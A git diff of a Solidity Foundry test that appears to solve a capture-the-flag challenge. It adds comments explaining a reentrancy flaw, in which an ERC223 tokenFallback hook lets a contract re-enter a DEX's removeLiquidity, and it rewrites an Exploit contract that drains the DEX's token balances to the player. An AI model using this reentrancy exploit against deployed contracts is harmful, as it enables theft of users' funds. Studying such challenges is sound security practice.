@@ -49,6 +49,16 @@ contract Challenge2Test is Test {
         //////////////////////////////*/      
 
         //============================//
+
+        // The DEX is vulnerable for two reasons:
+        // 1. token1 (ERC223) has a custom hook defined that calls a function `tokenFallback` whenever the token is transferred to
+        //      another smart contract
+        // 2. re-entrancy is possible because the DEX doesn't use modifiers and does not use the 'checks-effects' programming style
+        // As a result, we can abuse the hook to do a reentrancy attack on the DEX. To do this we open a position in the DEX on behalf
+        // of an exploit contract rather than using our EOA. We need this step so that the hook is triggered (it won't trigger for an EOA).
+        // The exploit contract has a malicious `tokenFallback` function that calls removeLiquidity multiple times against the DEX
+        // because the DEX transfers tokens to the exploit contract during liquidity removal which in turn triggers the hook.
+
         Exploit exploit = new Exploit(address(token0), address(token1), address(target), player);
         vm.label(address(exploit), "Exploit");
 
@@ -56,24 +66,14 @@ contract Challenge2Test is Test {
         token0.transfer(address(exploit), 1 ether);
         token1.transfer(address(exploit), 1 ether);
 
-        // 
-        exploit.approve();
-        exploit.exploit(1 ether); // maybe in a loop?
+        exploit.approve(); // do ERC20 approval so there no approval/balance issues
+        exploit.exploit(); 
 
+        // withdraw funds after exploit
         token0.transferFrom(address(exploit), player, token0.balanceOf(address(exploit)));
         token1.transferFrom(address(exploit), player, token1.balanceOf(address(exploit)));
-        //exploit.withdraw();
 
         vm.stopPrank();
-        // IDEA:
-        // 1. unchecked blocks open up a chance for overflows/underflows to occur
-        // overflow can occur in totalSupply or balances[msg.sender]
-        // - try sending 0s?
-        // 2. mismatched tokens ERC20 and ERC223
-        // - what does 223 do?
-        // 3. ERC223 contract here has a special _afterTokenTransfer method that calls tokenFallback in the DEX contract. Why? What's the issue?
-        // - maybe we can write our own tokenFallback function that the ERC223 will call to do... something
-        // 4. Deployer has set max approval for the tokens so that contract should be able to transfer everything
 
         assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
         assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
@@ -104,25 +104,20 @@ contract Exploit {
     }
 
     function approve() public {
-        // Allow player and DEX to have full control over this contracts funds
+        // Allow full control over this contract's funds
         token0.approve(address(dex), 10 ether);
         token1.approve(address(dex), 10 ether);
         token0.approve(address(player), 10 ether);
         token1.approve(address(player), 10 ether);
     }
-    function exploit(uint256 amount0) external {
-        dex.addLiquidity(amount0, amount0);
-        dex.removeLiquidity(amount0);
-    }
 
-    function withdraw() external {
-        // Ideally, restrict this to the player address
-        token0.transferFrom(address(this), player, token0.balanceOf(address(this)));
-        token1.transferFrom(address(this), player, token1.balanceOf(address(this)));
-    }
-
-    function swap() external {
-        dex.swap(address(token0), address(token1), 0);
+    // Call this after transferring funds into the contract
+    function exploit() external {
+        // Open a position in the DEX on behalf of the contract
+        dex.addLiquidity(1 ether, 1 ether);
+        // Begin attack. When dex.removeLiquidity calls safeTransfer, the ERC223 function will call tokenFallback in this contract.
+        // This allows us to re-enter the removeLiquidity step and drain all funds
+        dex.removeLiquidity(1 ether);
     }
 
     // matching function signature defined in ERC223 contract
